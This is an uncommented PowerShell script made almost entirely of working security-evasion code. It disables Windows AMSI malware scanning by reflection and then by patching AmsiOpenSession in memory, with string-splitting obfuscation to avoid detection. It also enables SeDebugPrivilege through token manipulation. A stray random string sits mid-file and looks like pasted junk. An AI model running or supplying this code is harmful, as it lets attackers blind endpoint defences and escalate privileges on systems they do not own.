$a = "si"; $b = "Am"; $c = "Utils"
$t = [Ref].Assembly.GetType("System.Management.Automation." + $b + $a + $c)
$f = $t.GetField("amsiInitFailed", "NonPublic,Static")
$f.SetValue($null, $true)

Add-Type @"
using System;
using System.Runtime.InteropServices;
public class TokenManipulator {
    [DllImport("advapi32.dll", ExactSpelling = true, SetLastError = true)]
    internal static extern bool AdjustTokenPrivileges(IntPtr htok, bool disall, ref TokPriv1Luid newst, int len, IntPtr prev, IntPtr rel);
    [DllImport("kernel32.dll", ExactSpelling = true)]
    internal static extern IntPtr GetCurrentProcess();
    [DllImport("advapi32.dll", ExactSpelling = true, SetLastError = true)]
    internal static extern bool OpenProcessToken(IntPtr h, int acc, ref IntPtr phtok);
    [DllImport("advapi32.dll", SetLastError = true)]
    internal static extern bool LookupPrivilegeValue(string host, string name, ref long pluid);
    [StructLayout(LayoutKind.Sequential, Pack = 1)]
    internal struct TokPriv1Luid {
        public int Count;
        public long Luid;
        public int Attr;
    }
    internal const int SE_PRIVILEGE_ENABLED = 0x00000002;
    internal const int TOKEN_QUERY = 0x00000008;
    internal const int TOKEN_ADJUST_PRIVILEGES = 0x00000020;
    public static bool AddPrivilege(string privilege) {
        TokPriv1Luid tp;
        IntPtr hproc = GetCurrentProcess();
        IntPtr htok = IntPtr.Zero;
        OpenProcessToken(hproc, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, ref htok);
        tp.Count = 1;
        tp.Luid = 0;
        tp.Attr = SE_PRIVILEGE_ENABLED;
        LookupPrivilegeValue(null, privilege, ref tp.Luid);
        return AdjustTokenPrivileges(htok, false, ref tp, 0, IntPtr.Zero, IntPtr.Zero);
    }
}
"@

[TokenManipulator]::AddPrivilege("SeDebugPrivilege")
[TokenManipulator]::AddPrivilege("SeDebugPrivilege")
whoami /priv | findstr Debug
a#5udLyI0FRygMSEHNPnTJoQ

function l {
    param($x, $y)
    $z = [AppDomain]::CurrentDomain.GetAssemblies() | ? { $_.GlobalAssemblyCache -and $_.Location.Split('\')[-1] -eq 'System.dll' }
    $t = $z.GetType('Microsoft.Win32.UnsafeNativeMethods')

    # Correct way to get GetModuleHandle
    $h = $t.GetMethod('GetModuleHandle', [Reflection.BindingFlags]'Public,Static', $null, [Type[]]@([string]), $null)

    # Correct way to get GetProcAddress (specify the overload)
    $m = $t.GetMethod('GetProcAddress', [Reflection.BindingFlags]'Public,Static', $null, [Type[]]@([IntPtr], [string]), $null)

    $mod = $h.Invoke($null, @($x))
    return $m.Invoke($null, @($mod, $y))
}

function d {
    param([Type[]]$p, [Type]$r = [Void])
    $a = [AppDomain]::CurrentDomain.DefineDynamicAssembly(
        (New-Object Reflection.AssemblyName('R')), 
        [Reflection.Emit.AssemblyBuilderAccess]::Run
    ).DefineDynamicModule('M', $false).DefineType(
        'T', 'Class, Public, Sealed, AnsiClass, AutoClass', [MulticastDelegate]
    )
    $a.DefineConstructor('RTSpecialName, HideBySig, Public', 
        [Reflection.CallingConventions]::Standard, $p
    ).SetImplementationFlags('Runtime, Managed')
    $a.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $r, $p
    ).SetImplementationFlags('Runtime, Managed')
    return $a.CreateType()
}

# === Execution ===
$dll  = -join ('a','m','s','i','.','d','l','l')
$func = -join ('A','m','s','i','O','p','e','n','S','e','s','s','i','o','n')

$addr = l $dll $func
$old  = 0

$vpAddr = l 'kernel32.dll' 'VirtualProtect'
$v = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    $vpAddr, 
    (d @([IntPtr], [UInt32], [UInt32], [UInt32].MakeByRefType()) ([Bool]))
)

$v.Invoke($addr, 3, 0x40, [ref]$old)
[Runtime.InteropServices.Marshal]::Copy([byte[]](0x48, 0x31, 0xC0), 0, $addr, 3)
$v.Invoke($addr, 3, 0x20, [ref]$old)

Write-Host "[+] AmsiOpenSession patched" -ForegroundColor Green
